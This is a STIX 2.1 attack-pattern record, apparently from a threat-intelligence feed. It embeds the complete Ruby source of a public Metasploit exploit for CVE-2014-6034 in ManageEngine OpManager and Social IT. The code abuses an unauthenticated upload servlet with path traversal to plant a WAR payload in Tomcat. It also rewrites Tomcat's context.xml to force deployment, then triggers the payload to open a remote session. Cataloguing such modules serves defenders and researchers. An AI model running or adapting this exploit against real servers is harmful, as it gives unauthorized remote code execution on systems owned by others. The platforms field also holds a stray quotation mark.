{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2469d515-a842-460f-bc07-68fa2260027c",
    "created": "2024-08-14T17:11:25.186785Z",
    "modified": "2024-08-14T17:11:25.18679Z",
    "name": "ManageEngine OpManager and Social IT Arbitrary File Upload",
    "description": " This module exploits a file upload vulnerability in ManageEngine OpManager and Social IT. The vulnerability exists in the FileCollector servlet which accepts unauthenticated file uploads. This module has been tested successfully on OpManager v8.8 - v11.3 and on version 11.0 of SocialIT for Windows and Linux. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/opmanager_socialit_file_upload.rb",
            "external_id": "opmanager_socialit_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6034"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2014/Sep/110"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'ManageEngine OpManager and Social IT Arbitrary File Upload',\n      'Description' => %q{\n        This module exploits a file upload vulnerability in ManageEngine OpManager and Social IT.\n        The vulnerability exists in the FileCollector servlet which accepts unauthenticated\n        file uploads. This module has been tested successfully on OpManager v8.8 - v11.3 and on\n        version 11.0 of SocialIT for Windows and Linux.\n      },\n      'Author'       =>\n        [\n          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability Discovery and Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2014-6034' ],\n          [ 'OSVDB', '112276' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2014/Sep/110' ]\n        ],\n      'Privileged'  => true,\n      'Platform'    => 'java',\n      'Arch'        => ARCH_JAVA,\n      'Targets'     =>\n        [\n          [ 'OpManager v8.8 - v11.3 / Social IT Plus 11.0 Java Universal', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-09-27'))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptInt.new('SLEEP',\n          [true, 'Seconds to sleep while we wait for WAR deployment', 15]),\n      ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri'    => normalize_uri(\"/servlet/com.me.opmanager.extranet.remote.communication.fw.fe.FileCollector\"),\n      'method' => 'GET'\n    })\n\n    # A GET request on this servlet returns \"405 Method not allowed\"\n    if res and res.code == 405\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def upload_war_and_exec(try_again, app_base)\n    tomcat_path = '../../../tomcat/'\n    servlet_path = '/servlet/com.me.opmanager.extranet.remote.communication.fw.fe.FileCollector'\n\n    if try_again\n      # We failed to obtain a shell. Either the target is not vulnerable or the Tomcat configuration\n      # does not allow us to deploy WARs. Fix that by uploading a new context.xml file.\n      # The file we are uploading has the same content apart from privileged=\"false\" and lots of XML comments.\n      # After replacing the context.xml file let's upload the WAR again.\n      print_status(\"Replacing Tomcat context file\")\n      send_request_cgi({\n        'uri' => normalize_uri(servlet_path),\n        'method' => 'POST',\n        'data' => %q{<?xml version='1.0' encoding='utf-8'?><Context privileged=\"true\"><WatchedResource>WEB-INF/web.xml</WatchedResource></Context>},\n        'ctype' => 'application/xml',\n        'vars_get' => {\n          'regionID' => tomcat_path + \"conf\",\n          'FILENAME' => \"context.xml\"\n        }\n      })\n    else\n      # We need to create the upload directories before our first attempt to upload the WAR.\n      print_status(\"Creating upload directories\")\n      bogus_file = rand_text_alphanumeric(4 + rand(32 - 4))\n      send_request_cgi({\n        'uri' => normalize_uri(servlet_path),\n        'method' => 'POST',\n        'data' => rand_text_alphanumeric(4 + rand(32 - 4)),\n        'ctype' => 'application/xml',\n        'vars_get' => {\n          'regionID' => \"\",\n          'FILENAME' => bogus_file\n        }\n      })\n      register_files_for_cleanup(\"state/archivedata/zip/\" + bogus_file)\n    end\n\n    war_payload = payload.encoded_war({ :app_name => app_base }).to_s\n\n    print_status(\"Uploading WAR file...\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(servlet_path),\n      'method' => 'POST',\n      'data' => war_payload,\n      'ctype' => 'application/octet-stream',\n      'vars_get' => {\n        'regionID' => tomcat_path + \"webapps\",\n        'FILENAME' => app_base + \".war\"\n      }\n    })\n\n    # The server either returns a 500 error or a 200 OK when the upload is successful.\n    if res and (res.code == 500 or res.code == 200)\n      print_good(\"Upload appears to have been successful, waiting \" + datastore['SLEEP'].to_s +\n      \" seconds for deployment\")\n      sleep(datastore['SLEEP'])\n    else\n      fail_with(Failure::Unknown, \"#{peer} - WAR upload failed\")\n    end\n\n    print_status(\"Executing payload, wait for session...\")\n    send_request_cgi({\n      'uri'    => normalize_uri(app_base, Rex::Text.rand_text_alpha(rand(8)+8)),\n      'method' => 'GET'\n    })\n  end\n\n\n  def exploit\n    app_base = rand_text_alphanumeric(4 + rand(32 - 4))\n\n    upload_war_and_exec(false, app_base)\n    register_files_for_cleanup(\"tomcat/webapps/\" + \"#{app_base}.war\")\n\n    sleep_counter = 0\n    while not session_created?\n      if sleep_counter == datastore['SLEEP']\n        print_error(\"Failed to get a shell, let's try one more time\")\n        upload_war_and_exec(true, app_base)\n        return\n      end\n\n      sleep(1)\n      sleep_counter += 1\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-09-27",
    "x_mitre_platforms": [
        "java'"
    ]
}